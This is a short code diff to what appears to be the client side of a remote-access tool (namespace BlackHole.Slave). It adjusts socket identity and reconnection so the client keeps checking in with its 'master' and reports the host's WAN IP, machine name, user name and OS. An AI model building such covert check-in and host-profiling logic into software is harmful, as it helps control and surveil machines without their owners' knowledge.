@@ -39,6 +39,7 @@ namespace BlackHole.Slave
             m_serverAddress = serverAddress;
             m_netContext = context;
             m_client = m_netContext.CreateDealerSocket();
+            m_client.Options.Identity = Encoding.Default.GetBytes(Guid.NewGuid().ToString("N"));
             m_client.Options.Linger = TimeSpan.Zero;
             m_client.ReceiveReady += ClientReceive;
 
@@ -52,14 +53,6 @@ namespace BlackHole.Slave
             m_poller.AddTimer(sendTimer);
             m_poller.AddSocket(m_client);
             m_poller.PollTillCancelledNonBlocking();
-            Connect();
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        private void Connect()
-        {
             m_client.Connect(m_serverAddress);
             Send(new GreetTheMasterMessage()
             {
@@ -68,8 +61,7 @@ namespace BlackHole.Slave
                 UserName = Environment.UserName,
                 OperatingSystem = Environment.OSVersion.VersionString
             });
-        }
-    
+        }        
 
         /// <summary>
         /// 
@@ -87,11 +79,16 @@ namespace BlackHole.Slave
                 i--;
             }
 
-            if(m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT && m_connected)
+            if (m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT && m_connected)
             {
-                UpdateLastReceived();
                 SetDisconnected();
-                Connect();
+                Send(new GreetTheMasterMessage()
+                {
+                    Ip = Utility.GetWanIp(),
+                    MachineName = Environment.MachineName,
+                    UserName = Environment.UserName,
+                    OperatingSystem = Environment.OSVersion.VersionString
+                });
             }
         }
 
